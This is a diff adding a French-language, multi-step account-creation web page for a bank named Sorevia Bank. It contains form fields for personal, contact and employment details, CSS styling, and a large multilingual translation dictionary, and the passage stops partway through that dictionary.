@@ -1,0 +1,949 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name="theme-color" content="#061c2b">
+<title>Sorevia Bank — Création de compte</title>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<style>
+:root{--navy:#061c2b;--navy2:#092d40;--blue:#087ac2;--blue2:#075a87;--cyan:#62d9f5;--green:#18a66a;--red:#d34f4f;--text:#17313c;--muted:#71858e;--border:#dbe6ea;--bg:#f3f7f9;--white:#fff;--shadow:0 20px 60px #00182718}*{box-sizing:border-box}html,body{margin:0;padding:0;font-family:Arial,sans-serif;background:var(--bg);color:var(--text)}body{min-height:100vh}.hidden{display:none!important}.page{min-height:100vh;display:flex;flex-direction:column}.header{height:72px;background:#fff;border-bottom:1px solid var(--border);display:flex;align-items:center}.headerInner{width:calc(100% - 30px);max-width:1050px;margin:auto;display:flex;align-items:center;justify-content:space-between}.brand{display:flex;align-items:center;gap:9px;color:var(--navy);text-decoration:none}.logo{width:42px;height:42px;border-radius:12px;background:linear-gradient(145deg,#0aa3df,#07537c);color:#fff;display:grid;place-items:center;font:bold 25px Georgia}.brand strong{font:700 18px Georgia;display:block}.brand small{font-size:7px;letter-spacing:2px;color:#82959d}.loginLink{font-size:10px;font-weight:bold;color:var(--blue);text-decoration:none}.main{width:calc(100% - 20px);max-width:760px;margin:30px auto 80px}.hero{text-align:center;margin-bottom:25px}.eyebrow{font-size:9px;letter-spacing:2px;color:var(--blue);font-weight:bold}.hero h1{font:700 31px Georgia;margin:8px 0}.hero p{font-size:11px;color:var(--muted);margin:0;line-height:1.6}.card{background:#fff;border:1px solid var(--border);border-radius:22px;padding:25px;box-shadow:var(--shadow)}.steps{display:grid;grid-template-columns:repeat(5,1fr);gap:7px;margin-bottom:25px}.step{height:7px;background:#e4ecef;border-radius:20px;overflow:hidden}.step.active{background:linear-gradient(90deg,var(--blue),var(--cyan))}.stepText{text-align:center;font-size:9px;color:var(--muted);margin:-16px 0 22px}.panel{display:none}.panel.active{display:block}.sectionHead{margin-bottom:20px}.sectionHead h2{font:700 23px Georgia;margin:5px 0}.sectionHead p{font-size:9px;color:var(--muted);margin:0;line-height:1.5}.grid{display:grid;grid-template-columns:1fr 1fr;gap:13px}.field{margin-bottom:13px}.field.full{grid-column:1/-1}.field label{display:block;font-size:9px;font-weight:bold;margin-bottom:7px}.input,.select,.textarea{width:100%;height:48px;border:1px solid var(--border);border-radius:10px;background:#fff;padding:0 12px;outline:none;color:var(--text);font-size:11px}.dateParts{display:grid;grid-template-columns:1fr 1.15fr 1fr;gap:8px}.dateParts .select{min-width:0;padding:0 9px}.textarea{height:85px;padding:12px;resize:vertical}.input:focus,.select:focus,.textarea:focus{border-color:var(--blue);box-shadow:0 0 0 3px #087ac218}.field.bad .input,.field.bad .select,.field.bad .textarea{border-color:var(--red)}.hint{font-size:8px;color:var(--muted);margin-top:5px}.navButtons{display:flex;gap:9px;margin-top:20px}.btn{height:48px;border-radius:10px;font-size:10px;font-weight:bold;cursor:pointer}.primary{border:0;background:linear-gradient(135deg,var(--blue),var(--blue2));color:#fff;flex:1}.secondary{border:1px solid var(--border);background:#fff;color:#607780;padding:0 20px}.primary:disabled{opacity:.7;cursor:not-allowed}.notice{background:#eef8fb;border:1px solid #d1ebf1;border-radius:12px;padding:13px;margin-bottom:17px;font-size:9px;line-height:1.5}.countryInfo{display:flex;gap:10px;align-items:center;background:#f5fafc;border:1px solid var(--border);border-radius:10px;padding:11px;margin-top:3px}.countryFlag{font-size:23px}.countryInfo strong{display:block;font-size:10px}.countryInfo span{display:block;font-size:8px;color:var(--muted);margin-top:3px}.camera{background:#fff;border:1px solid var(--border);border-radius:12px;padding:13px}.camera label{display:block;font-size:9px;font-weight:bold;margin-bottom:7px;color:var(--text)}.camera input{width:100%;font-size:11px;color:var(--text);background:#fff;border:0;padding:0}.passwordBox{position:relative}.togglePass{position:absolute;right:10px;top:35px;border:0;background:none;color:var(--blue);font-size:9px;cursor:pointer}.check{display:flex;gap:8px;align-items:flex-start;margin:11px 0;font-size:9px;color:#536b74;line-height:1.5}.check input{margin-top:2px}.success{display:none;text-align:center;padding:25px}.successIcon{width:62px;height:62px;border-radius:18px;background:#e9f8f1;color:var(--green);display:grid;place-items:center;font-size:28px;margin:0 auto 15px}.success h2{font:700 23px Georgia;margin:0 0 8px}.success p{font-size:10px;color:var(--muted);line-height:1.6}.loader{display:inline-block;width:13px;height:13px;border:2px solid #ffffff55;border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:-2px;margin-right:6px}@keyframes spin{to{transform:rotate(360deg)}}.footer{text-align:center;color:#8ca2aa;font-size:8px;padding:20px}.footer strong{display:block;color:#087ac2;font:700 11px Georgia;margin-bottom:5px}@media(max-width:600px){.main{margin-top:18px}.card{padding:17px;border-radius:17px}.grid{grid-template-columns:1fr}.field.full{grid-column:auto}.hero h1{font-size:25px}.steps{gap:4px}.loginLink{font-size:9px}.navButtons{position:relative}.secondary{padding:0 14px}}
+</style>
+</head>
+
+<body>
+
+<div class="page">
+
+<header class="header">
+<div class="headerInner">
+<a class="brand" href="index.html">
+<span class="logo">S</span>
+<span><strong>Sorevia Bank</strong><small>DIGITAL BANKING</small></span>
+</a>
+<a class="loginLink" href="connecter.html">Déjà client ? Se connecter</a>
+</div>
+</header>
+
+<main class="main">
+
+<div class="hero">
+<span class="eyebrow">SOREVIA BANK</span>
+<h1>Créer votre compte</h1>
+<p>Complétez les informations ci-dessous pour ouvrir votre espace bancaire.</p>
+</div>
+
+<div class="card">
+
+<div class="steps">
+<div class="step active" id="bar1"></div>
+<div class="step" id="bar2"></div>
+<div class="step" id="bar3"></div>
+<div class="step" id="bar4"></div>
+<div class="step" id="bar5"></div>
+</div>
+
+<div class="stepText" id="stepText">Étape 1 sur 5 — Informations personnelles</div>
+
+<section class="panel active" id="step1">
+
+<div class="sectionHead">
+<span class="eyebrow">ÉTAPE 1</span>
+<h2>Informations personnelles</h2>
+<p>Renseignez votre identité exactement comme elle apparaît sur votre document officiel.</p>
+</div>
+
+<div class="grid">
+
+<div class="field" id="nomBox">
+<label for="nom">Nom *</label>
+<input class="input" id="nom" type="text" autocomplete="family-name" placeholder="Votre nom">
+</div>
+
+<div class="field" id="prenomBox">
+<label for="prenom">Prénom *</label>
+<input class="input" id="prenom" type="text" autocomplete="given-name" placeholder="Votre prénom">
+</div>
+
+<div class="field" id="dateBox">
+<label>Date de naissance *</label>
+<div class="dateParts" data-date-group="dateNaissance">
+<select class="select" id="dateNaissanceJour" aria-label="Jour de naissance"><option value="">Jour</option></select>
+<select class="select" id="dateNaissanceMois" aria-label="Mois de naissance"><option value="">Mois</option></select>
+<select class="select" id="dateNaissanceAn" aria-label="Année de naissance"><option value="">Année</option></select>
+</div>
+<input id="dateNaissance" type="hidden">
+</div>
+
+<div class="field" id="sexeBox">
+<label for="sexe">Sexe *</label>
+<select class="select" id="sexe">
+<option value="">Choisir</option>
+<option value="Masculin">Masculin</option>
+<option value="Féminin">Féminin</option>
+<option value="Autre">Autre</option>
+</select>
+</div>
+
+<div class="field full" id="nationaliteBox">
+<label for="nationalite">Nationalité *</label>
+<input class="input" id="nationalite" type="text" placeholder="Votre nationalité">
+</div>
+
+</div>
+
+<div class="navButtons">
+<button class="primary btn" id="continue1" type="button">Continuer →</button>
+</div>
+
+</section>
+
+<section class="panel" id="step2">
+
+<div class="sectionHead">
+<span class="eyebrow">ÉTAPE 2</span>
+<h2>Coordonnées et résidence</h2>
+<p>Indiquez vos coordonnées et votre pays de résidence.</p>
+</div>
+
+<div class="grid">
+
+<div class="field" id="emailBox">
+<label for="email">Adresse e-mail *</label>
+<input class="input" id="email" type="email" autocomplete="email" placeholder="exemple@gmail.com">
+</div>
+
+<div class="field" id="telephoneBox">
+<label for="telephone">Téléphone *</label>
+<input class="input" id="telephone" type="tel" autocomplete="tel" placeholder="+33 X XX XX XX XX">
+</div>
+
+<div class="field" id="continentBox">
+<label for="continent">Continent *</label>
+<select class="select" id="continent">
+<option value="">Choisir un continent</option>
+<option value="Afrique">Afrique</option>
+<option value="Amérique">Amérique</option>
+<option value="Asie">Asie</option>
+<option value="Europe">Europe</option>
+<option value="Océanie">Océanie</option>
+</select>
+</div>
+
+<div class="field" id="paysBox">
+<label for="pays">Pays *</label>
+<select class="select" id="pays">
+<option value="">Choisir un pays</option>
+</select>
+</div>
+
+<div class="field" id="deviseBox">
+<label for="devise">Devise *</label>
+<select class="select" id="devise">
+<option value="">Choisir une devise</option>
+</select>
+</div>
+
+<div class="field" id="villeBox">
+<label for="ville">Ville *</label>
+<input class="input" id="ville" type="text" placeholder="Votre ville">
+</div>
+
+<div class="field full" id="adresseBox">
+<label for="adresse">Adresse complète *</label>
+<textarea class="textarea" id="adresse" placeholder="Votre adresse"></textarea>
+</div>
+
+</div>
+
+<div class="countryInfo">
+<div class="countryFlag" id="countryFlag">🌍</div>
+<div>
+<strong id="countryName">Pays non sélectionné</strong>
+<span id="countryCurrency">Sélectionnez votre pays pour afficher sa devise.</span>
+</div>
+</div>
+
+<div class="navButtons">
+<button class="secondary btn" id="back2" type="button">← Retour</button>
+<button class="primary btn" id="continue2" type="button">Continuer →</button>
+</div>
+
+</section>
+
+<section class="panel" id="step3">
+
+<div class="sectionHead">
+<span class="eyebrow">ÉTAPE 3</span>
+<h2>Situation professionnelle</h2>
+<p>Ces informations permettent de compléter votre profil bancaire.</p>
+</div>
+
+<div class="grid">
+
+<div class="field full" id="professionBox">
+<label for="profession">Profession *</label>
+<input class="input" id="profession" type="text" placeholder="Votre profession">
+</div>
+
+<div class="field full" id="revenusBox">
+<label for="revenus">Revenus mensuels *</label>
+<input class="input" id="revenus" type="number" min="0" step="1" placeholder="Montant">
+<div class="hint">Saisissez uniquement le montant numérique.</div>
+</div>
+
+</div>
+
+<div class="notice">
+<strong>🔰Protection de vos informations</strong><br>
+Les informations saisies sont associées à votre compte utilisateur bancaire.
+</div>
+
+<div class="navButtons">
+<button class="secondary btn" id="back3" type="button">← Retour</button>
+<button class="primary btn" id="continue3" type="button">Continuer →</button>
+</div>
+
+</section>
+
+
+<script>
+(function(){
+var SUP=["fr","en","es","it","de","pt","pl","ru","nl","tr"];
+var DEF={fr:"fr-FR",en:"en-US",es:"es-ES",it:"it-IT",de:"de-DE",pt:"pt-BR",pl:"pl-PL",ru:"ru-RU",nl:"nl-NL",tr:"tr-TR"};
+var D={"Adresse complète *":["Full address *","Dirección completa *","Indirizzo completo *","Vollständige Adresse *","Morada completa *","Pełny adres *","Полный адрес *","Volledig adres *","Açık adres *"],"Adresse e-mail *":["Email address *","Correo electrónico *","Indirizzo email *","E-Mail-Adresse *","Endereço de e-mail *","Adres e-mail *","Адрес электронной почты *","E-mailadres *","E-posta adresi *"],"Afficher":["Show","Mostrar","Mostra","Anzeigen","Mostrar","Pokaż","Показать","Tonen","Göster"],"Afrique":["Africa","África","Africa","Afrika","África","Afryka","Африка","Afrika","Afrika"],"Ajoutez les informations de votre pièce d'identité.":["Add the details of your identity document.","Añada los datos de su documento de identidad.","Aggiunga i dati del suo documento d’identità.","Ergänzen Sie die Angaben zu Ihrem Ausweisdokument.","Adicione os dados do seu documento de identificação.","Dodaj dane swojego dokumentu tożsamości.","Добавьте данные вашего документа, удостоверяющего личность.","Voeg de gegevens van uw identiteitsdocument toe.","Kimlik belgenizin bilgilerini ekleyiniz."],"Amérique":["America","América","America","Amerika","América","Ameryka","Америка","Amerika","Amerika"],"Année":["Year","Año","Anno","Jahr","Ano","Rok","Год","Jaar","Yıl"],"Année d'expiration":["Expiry year","Año de caducidad","Anno di scadenza","Ablaufjahr","Ano de validade","Rok ważności","Год окончания срока","Vervaljaar","Son geçerlilik yılı"],"Année de naissance":["Year of birth","Año de nacimiento","Anno di nascita","Geburtsjahr","Ano de nascimento","Rok urodzenia","Год рождения","Geboortejaar","Doğum yılı"],"Asie":["Asia","Asia","Asia","Asien","Ásia","Azja","Азия","Azië","Asya"],"Autre":["Other","Otro","Altro","Sonstiges","Outro","Inne","Другое","Anders","Diğer"],"Carte de séjour":["Residence permit","Permiso de residencia","Permesso di soggiorno","Aufenthaltstitel","Título de residência","Karta pobytu","Вид на жительство","Verblijfsvergunning","Oturma izni"],"Carte nationale d'identité":["National ID card","Documento nacional de identidad","Carta d’identità nazionale","Nationaler Personalausweis","Cartão de cidadão / bilhete de identidade","Krajowy dowód osobisty","Национальное удостоверение личности","Nationale identiteitskaart","Ulusal kimlik kartı"],"Ce compte existe déjà.":["This account already exists.","Esta cuenta ya existe.","Questo conto esiste già.","Dieses Konto existiert bereits.","Esta conta já existe.","To konto już istnieje.","Такой аккаунт уже существует.","Dit account bestaat al.","Bu hesap zaten mevcut."],"Ces informations permettent de compléter votre profil bancaire.":["This information helps complete your banking profile.","Esta información permite completar su perfil bancario.","Queste informazioni servono a completare il suo profilo bancario.","Diese Angaben vervollständigen Ihr Bankprofil.","Estas informações permitem completar o seu perfil bancário.","Te informacje pozwalają uzupełnić Twój profil bankowy.","Эти данные позволяют дополнить ваш банковский профиль.","Deze gegevens vervolledigen uw bankprofiel.","Bu bilgiler bankacılık profilinizi tamamlamaya yardımcı olur."],"Choisir":["Choose","Elegir","Scegli","Auswählen","Escolher","Wybierz","Выбрать","Kiezen","Seçiniz"],"Choisir un continent":["Choose a continent","Elegir un continente","Scegli un continente","Kontinent auswählen","Escolher um continente","Wybierz kontynent","Выберите континент","Kies een continent","Bir kıta seçiniz"],"Choisir un pays":["Choose a country","Elegir un país","Scegli un paese","Land auswählen","Escolher um país","Wybierz kraj","Выберите страну","Kies een land","Bir ülke seçiniz"],"Choisir une devise":["Choose a currency","Elegir una divisa","Scegli una valuta","Währung auswählen","Escolher uma moeda","Wybierz walutę","Выберите валюту","Kies een valuta","Bir para birimi seçiniz"],"Complétez les informations ci-dessous pour ouvrir votre espace bancaire.":["Complete the information below to open your banking area.","Complete la información siguiente para abrir su espacio bancario.","Completi le informazioni qui sotto per aprire il suo spazio bancario.","Füllen Sie die folgenden Angaben aus, um Ihren Bankbereich zu eröffnen.","Preencha as informações abaixo para abrir o seu espaço bancário.","Uzupełnij poniższe informacje, aby otworzyć swoją strefę bankową.","Заполните данные ниже, чтобы открыть свой банковский кабинет.","Vul de onderstaande gegevens in om uw bankomgeving te openen.","Bankacılık alanınızı açmak için aşağıdaki bilgileri doldurun."],"Compte Sorevia créé avec succès. Vous pouvez accéder à votre compte maintenant.":["Sorevia account created successfully. You can now access your account.","Cuenta Sorevia creada con éxito. Ya puede acceder a su cuenta.","Conto Sorevia creato con successo. Ora può accedere al suo conto.","Sorevia-Konto erfolgreich erstellt. Sie können jetzt auf Ihr Konto zugreifen.","Conta Sorevia criada com sucesso. Já pode aceder à sua conta.","Konto Sorevia zostało utworzone. Możesz teraz uzyskać dostęp do konta.","Счёт Sorevia успешно создан. Теперь вы можете войти в свой счёт.","Sorevia-rekening succesvol aangemaakt. U kunt nu toegang krijgen tot uw rekening.","Sorevia hesabı başarıyla oluşturuldu. Artık hesabınıza erişebilirsiniz."],"Compte créé avec succès":["Account created successfully","Cuenta creada con éxito","Conto creato con successo","Konto erfolgreich erstellt","Conta criada com sucesso","Konto zostało utworzone","Счёт успешно создан","Rekening succesvol aangemaakt","Hesap başarıyla oluşturuldu"],"Compte créé ✓":["Account created ✓","Cuenta creada ✓","Conto creato ✓","Konto erstellt ✓","Conta criada ✓","Konto utworzone ✓","Счёт создан ✓","Rekening aangemaakt ✓","Hesap oluşturuldu ✓"],"Confirmer le mot de passe *":["Confirm password *","Confirmar contraseña *","Conferma password *","Passwort bestätigen *","Confirmar palavra-passe *","Potwierdź hasło *","Подтвердите пароль *","Bevestig wachtwoord *","Şifreyi onaylayın *"],"Confirmez votre mot de passe":["Confirm your password","Confirme su contraseña","Confermi la sua password","Bestätigen Sie Ihr Passwort","Confirme a sua palavra-passe","Potwierdź swoje hasło","Подтвердите ваш пароль","Bevestig uw wachtwoord","Şifrenizi onaylayın"],"Continent *":["Continent *","Continente *","Continente *","Kontinent *","Continente *","Kontynent *","Континент *","Continent *","Kıta *"],"Continuer →":["Continue →","Continuar →","Continua →","Weiter →","Continuar →","Dalej →","Продолжить →","Doorgaan →","Devam →"],"Coordonnées et résidence":["Contact details and residence","Datos de contacto y residencia","Recapiti e residenza","Kontaktdaten und Wohnsitz","Contactos e residência","Dane kontaktowe i miejsce zamieszkania","Контактные данные и место жительства","Contactgegevens en woonplaats","İletişim bilgileri ve ikamet"],"Création...":["Creating...","Creando...","Creazione...","Wird erstellt...","A criar...","Tworzenie...","Создание...","Aanmaken...","Oluşturuluyor..."],"Créer mon compte ✓":["Create my account ✓","Crear mi cuenta ✓","Crea il mio conto ✓","Mein Konto erstellen ✓","Criar a minha conta ✓","Załóż moje konto ✓","Создать мой счёт ✓","Mijn rekening aanmaken ✓","Hesabımı oluştur ✓"],"Créer votre compte":["Create your account","Cree su cuenta","Crei il suo conto","Erstellen Sie Ihr Konto","Crie a sua conta","Załóż konto","Создайте свой счёт","Maak uw rekening aan","Hesabınızı oluşturun"],"Créez le mot de passe qui sera utilisé pour accéder à votre espace.":["Create the password you will use to access your account area.","Cree la contraseña que utilizará para acceder a su espacio.","Crei la password che userà per accedere al suo spazio.","Legen Sie das Passwort fest, mit dem Sie auf Ihren Bereich zugreifen.","Crie a palavra-passe que utilizará para aceder ao seu espaço.","Utwórz hasło, którego będziesz używać do logowania do swojej strefy.","Создайте пароль, который будет использоваться для входа в ваш кабинет.","Maak het wachtwoord aan waarmee u toegang krijgt tot uw omgeving.","Alanınıza erişmek için kullanacağınız şifreyi oluşturunuz."],"Date d'expiration *":["Expiry date *","Fecha de caducidad *","Data di scadenza *","Ablaufdatum *","Data de validade *","Data ważności *","Срок действия *","Vervaldatum *","Son geçerlilik tarihi *"],"Date de naissance *":["Date of birth *","Fecha de nacimiento *","Data di nascita *","Geburtsdatum *","Data de nascimento *","Data urodzenia *","Дата рождения *","Geboortedatum *","Doğum tarihi *"],"Date invalide":["Invalid date","Fecha no válida","Data non valida","Ungültiges Datum","Data inválida","Nieprawidłowa data","Недопустимая дата","Ongeldige datum","Geçersiz tarih"],"Devise *":["Currency *","Divisa *","Valuta *","Währung *","Moeda *","Waluta *","Валюта *","Valuta *","Para birimi *"],"Déjà client ? Se connecter":["Already a customer? Log in","¿Ya es cliente? Inicie sesión","Già cliente? Accedi","Bereits Kunde? Anmelden","Já é cliente? Entrar","Masz już konto? Zaloguj się","Уже клиент? Войти","Al klant? Inloggen","Zaten müşteri misiniz? Giriş yapın"],"Erreur inconnue.":["Unknown error.","Error desconocido.","Errore sconosciuto.","Unbekannter Fehler.","Erro desconhecido.","Nieznany błąd.","Неизвестная ошибка.","Onbekende fout.","Bilinmeyen hata."],"Europe":["Europe","Europa","Europa","Europa","Europa","Europa","Европа","Europa","Avrupa"],"Firebase refuse l'écriture dans Firestore. Vérifiez les règles Firestore.":["Firebase refuses to write to Firestore. Check your Firestore rules.","Firebase rechaza la escritura en Firestore. Compruebe las reglas de Firestore.","Firebase rifiuta la scrittura su Firestore. Verifichi le regole di Firestore.","Firebase verweigert das Schreiben in Firestore. Prüfen Sie die Firestore-Regeln.","O Firebase recusa a escrita no Firestore. Verifique as regras do Firestore.","Firebase odmawia zapisu w Firestore. Sprawdź reguły Firestore.","Firebase отклоняет запись в Firestore. Проверьте правила Firestore.","Firebase weigert te schrijven naar Firestore. Controleer de Firestore-regels.","Firebase, Firestore’a yazmayı reddediyor. Firestore kurallarını kontrol ediniz."],"Féminin":["Female","Femenino","Femminile","Weiblich","Feminino","Kobieta","Женский","Vrouw","Kadın"],"Impossible de créer le compte.":["Unable to create the account.","No se puede crear la cuenta.","Impossibile creare il conto.","Das Konto kann nicht erstellt werden.","Não foi possível criar a conta.","Nie można utworzyć konta.","Не удалось создать счёт.","De rekening kan niet worden aangemaakt.","Hesap oluşturulamadı."],"Impossible de lire la photo sélectionnée.":["Unable to read the selected photo.","No se puede leer la foto seleccionada.","Impossibile leggere la foto selezionata.","Das ausgewählte Foto kann nicht gelesen werden.","Não foi possível ler a fotografia selecionada.","Nie można odczytać wybranego zdjęcia.","Не удалось прочитать выбранное фото.","De geselecteerde foto kan niet worden gelezen.","Seçilen fotoğraf okunamadı."],"Indiquez vos coordonnées et votre pays de résidence.":["Enter your contact details and your country of residence.","Indique sus datos de contacto y su país de residencia.","Inserisca i suoi recapiti e il paese di residenza.","Geben Sie Ihre Kontaktdaten und Ihr Wohnsitzland an.","Indique os seus contactos e o seu país de residência.","Podaj dane kontaktowe i kraj zamieszkania.","Укажите контактные данные и страну проживания.","Geef uw contactgegevens en uw land van verblijf op.","İletişim bilgilerinizi ve ikamet ettiğiniz ülkeyi belirtiniz."],"Informations personnelles":["Personal information","Información personal","Informazioni personali","Persönliche Angaben","Informações pessoais","Dane osobowe","Личные данные","Persoonlijke gegevens","Kişisel bilgiler"],"J'accepte les conditions générales d'utilisation de Sorevia Bank.":["I accept the Sorevia Bank terms and conditions of use.","Acepto las condiciones generales de uso de Sorevia Bank.","Accetto le condizioni generali d’uso di Sorevia Bank.","Ich akzeptiere die Allgemeinen Nutzungsbedingungen von Sorevia Bank.","Aceito as condições gerais de utilização do Sorevia Bank.","Akceptuję regulamin korzystania z Sorevia Bank.","Я принимаю условия использования Sorevia Bank.","Ik accepteer de algemene gebruiksvoorwaarden van Sorevia Bank.","Sorevia Bank kullanım koşullarını kabul ediyorum."],"Je certifie que les informations fournies sont exactes.":["I certify that the information provided is accurate.","Certifico que la información facilitada es exacta.","Certifico che le informazioni fornite sono esatte.","Ich bestätige, dass die gemachten Angaben richtig sind.","Certifico que as informações fornecidas são exatas.","Oświadczam, że podane informacje są prawdziwe.","Подтверждаю, что предоставленные сведения достоверны.","Ik verklaar dat de verstrekte gegevens juist zijn.","Verdiğim bilgilerin doğru olduğunu beyan ederim."],"Jour":["Day","Día","Giorno","Tag","Dia","Dzień","День","Dag","Gün"],"Jour d'expiration":["Expiry day","Día de caducidad","Giorno di scadenza","Ablauftag","Dia de validade","Dzień ważności","День окончания срока","Vervaldag","Son geçerlilik günü"],"Jour de naissance":["Day of birth","Día de nacimiento","Giorno di nascita","Geburtstag","Dia de nascimento","Dzień urodzenia","День рождения","Geboortedag","Doğum günü"],"L'adresse e-mail est invalide.":["The email address is invalid.","La dirección de correo electrónico no es válida.","L’indirizzo email non è valido.","Die E-Mail-Adresse ist ungültig.","O endereço de e-mail é inválido.","Adres e-mail jest nieprawidłowy.","Адрес электронной почты недействителен.","Het e-mailadres is ongeldig.","E-posta adresi geçersiz."],"Le mot de passe doit contenir au moins 6 caractères.":["The password must contain at least 6 characters.","La contraseña debe contener al menos 6 caracteres.","La password deve contenere almeno 6 caratteri.","Das Passwort muss mindestens 6 Zeichen enthalten.","A palavra-passe deve conter pelo menos 6 caracteres.","Hasło musi zawierać co najmniej 6 znaków.","Пароль должен содержать не менее 6 символов.","Het wachtwoord moet minstens 6 tekens bevatten.","Şifre en az 6 karakter içermelidir."],"Le mot de passe est trop faible.":["The password is too weak.","La contraseña es demasiado débil.","La password è troppo debole.","Das Passwort ist zu schwach.","A palavra-passe é demasiado fraca.","Hasło jest zbyt słabe.","Пароль слишком слабый.","Het wachtwoord is te zwak.","Şifre çok zayıf."],"Les deux mots de passe ne correspondent pas.":["The two passwords do not match.","Las dos contraseñas no coinciden.","Le due password non corrispondono.","Die beiden Passwörter stimmen nicht überein.","As duas palavras-passe não coincidem.","Oba hasła nie są zgodne.","Пароли не совпадают.","De twee wachtwoorden komen niet overeen.","İki şifre birbiriyle eşleşmiyor."],"Les informations saisies sont associées à votre compte utilisateur bancaire.":["The information entered is linked to your bank user account.","La información introducida se asocia a su cuenta de usuario bancaria.","Le informazioni inserite sono associate al suo account bancario.","Die eingegebenen Daten werden Ihrem Bankbenutzerkonto zugeordnet.","As informações introduzidas ficam associadas à sua conta de utilizador bancária.","Wprowadzone informacje są powiązane z Twoim bankowym kontem użytkownika.","Введённые данные связываются с вашей банковской учётной записью.","De ingevoerde gegevens worden gekoppeld aan uw bankgebruikersaccount.","Girilen bilgiler banka kullanıcı hesabınızla ilişkilendirilir."],"Masculin":["Male","Masculino","Maschile","Männlich","Masculino","Mężczyzna","Мужской","Man","Erkek"],"Masquer":["Hide","Ocultar","Nascondi","Verbergen","Ocultar","Ukryj","Скрыть","Verbergen","Gizle"],"Mois":["Month","Mes","Mese","Monat","Mês","Miesiąc","Месяц","Maand","Ay"],"Mois d'expiration":["Expiry month","Mes de caducidad","Mese di scadenza","Ablaufmonat","Mês de validade","Miesiąc ważności","Месяц окончания срока","Vervalmaand","Son geçerlilik ayı"],"Mois de naissance":["Month of birth","Mes de nacimiento","Mese di nascita","Geburtsmonat","Mês de nascimento","Miesiąc urodzenia","Месяц рождения","Geboortemaand","Doğum ayı"],"Montant":["Amount","Importe","Importo","Betrag","Montante","Kwota","Сумма","Bedrag","Tutar"],"Mot de passe *":["Password *","Contraseña *","Password *","Passwort *","Palavra-passe *","Hasło *","Пароль *","Wachtwoord *","Şifre *"],"Nationalité *":["Nationality *","Nacionalidad *","Nazionalità *","Staatsangehörigkeit *","Nacionalidade *","Obywatelstwo *","Гражданство *","Nationaliteit *","Uyruk *"],"Nom *":["Last name *","Apellidos *","Cognome *","Nachname *","Apelido *","Nazwisko *","Фамилия *","Achternaam *","Soyad *"],"Numéro du document":["Document number","Número del documento","Numero del documento","Dokumentennummer","Número do documento","Numer dokumentu","Номер документа","Documentnummer","Belge numarası"],"Numéro du document *":["Document number *","Número del documento *","Numero del documento *","Dokumentennummer *","Número do documento *","Numer dokumentu *","Номер документа *","Documentnummer *","Belge numarası *"],"Océanie":["Oceania","Oceanía","Oceania","Ozeanien","Oceânia","Oceania","Океания","Oceanië","Okyanusya"],"Passeport":["Passport","Pasaporte","Passaporto","Reisepass","Passaporte","Paszport","Паспорт","Paspoort","Pasaport"],"Pays *":["Country *","País *","Paese *","Land *","País *","Kraj *","Страна *","Land *","Ülke *"],"Pays non sélectionné":["No country selected","País no seleccionado","Paese non selezionato","Kein Land ausgewählt","País não selecionado","Nie wybrano kraju","Страна не выбрана","Geen land geselecteerd","Ülke seçilmedi"],"Permis de conduire":["Driving licence","Permiso de conducir","Patente di guida","Führerschein","Carta de condução","Prawo jazdy","Водительские права","Rijbewijs","Sürücü belgesi"],"Prendre une photo de votre pièce d'identité":["Take a photo of your identity document","Tome una foto de su documento de identidad","Scatti una foto del suo documento d’identità","Fotografieren Sie Ihr Ausweisdokument","Tire uma fotografia do seu documento de identificação","Zrób zdjęcie swojego dokumentu tożsamości","Сфотографируйте ваш документ, удостоверяющий личность","Maak een foto van uw identiteitsdocument","Kimlik belgenizin fotoğrafını çekiniz"],"Profession *":["Occupation *","Profesión *","Professione *","Beruf *","Profissão *","Zawód *","Профессия *","Beroep *","Meslek *"],"Prénom *":["First name *","Nombre *","Nome *","Vorname *","Nome próprio *","Imię *","Имя *","Voornaam *","Ad *"],"Renseignez votre identité exactement comme elle apparaît sur votre document officiel.":["Enter your identity exactly as it appears on your official document.","Indique su identidad exactamente como aparece en su documento oficial.","Inserisca la sua identità esattamente come appare sul documento ufficiale.","Geben Sie Ihre Identität genau so an, wie sie in Ihrem amtlichen Dokument steht.","Indique a sua identidade exatamente como aparece no seu documento oficial.","Podaj dane dokładnie tak, jak widnieją w Twoim dokumencie urzędowym.","Укажите данные точно так, как они указаны в вашем официальном документе.","Vul uw identiteit precies in zoals die op uw officiële document staat.","Kimliğinizi resmi belgenizde göründüğü şekilde aynen giriniz."],"Revenus mensuels *":["Monthly income *","Ingresos mensuales *","Reddito mensile *","Monatliches Einkommen *","Rendimento mensal *","Miesięczny dochód *","Ежемесячный доход *","Maandinkomen *","Aylık gelir *"],"Saisissez uniquement le montant numérique.":["Enter the numeric amount only.","Introduzca únicamente el importe numérico.","Inserisca solo l’importo numerico.","Geben Sie nur den Zahlenbetrag ein.","Introduza apenas o montante numérico.","Wpisz wyłącznie kwotę liczbową.","Введите только числовую сумму.","Voer alleen het numerieke bedrag in.","Yalnızca sayısal tutarı giriniz."],"Sexe *":["Sex *","Sexo *","Sesso *","Geschlecht *","Sexo *","Płeć *","Пол *","Geslacht *","Cinsiyet *"],"Situation professionnelle":["Employment status","Situación laboral","Situazione professionale","Berufliche Situation","Situação profissional","Sytuacja zawodowa","Профессиональный статус","Beroepssituatie","Çalışma durumu"],"Sorevia Bank — Création de compte":["Sorevia Bank — Account creation","Sorevia Bank — Creación de cuenta","Sorevia Bank — Creazione del conto","Sorevia Bank — Kontoeröffnung","Sorevia Bank — Criação de conta","Sorevia Bank — Zakładanie konta","Sorevia Bank — Открытие счёта","Sorevia Bank — Rekening aanmaken","Sorevia Bank — Hesap oluşturma"],"Sécurisez votre compte":["Secure your account","Proteja su cuenta","Metta in sicurezza il suo conto","Sichern Sie Ihr Konto","Proteja a sua conta","Zabezpiecz swoje konto","Защитите свой счёт","Beveilig uw rekening","Hesabınızı güvenceye alın"],"Sécurité du compte":["Account security","Seguridad de la cuenta","Sicurezza del conto","Kontosicherheit","Segurança da conta","Bezpieczeństwo konta","Безопасность счёта","Rekeningbeveiliging","Hesap güvenliği"],"Sélectionnez votre pays pour afficher sa devise.":["Select your country to display its currency.","Seleccione su país para mostrar su divisa.","Selezioni il suo paese per visualizzare la valuta.","Wählen Sie Ihr Land, um die Währung anzuzeigen.","Selecione o seu país para apresentar a moeda.","Wybierz kraj, aby zobaczyć jego walutę.","Выберите страну, чтобы увидеть её валюту.","Selecteer uw land om de valuta te tonen.","Para birimini görmek için 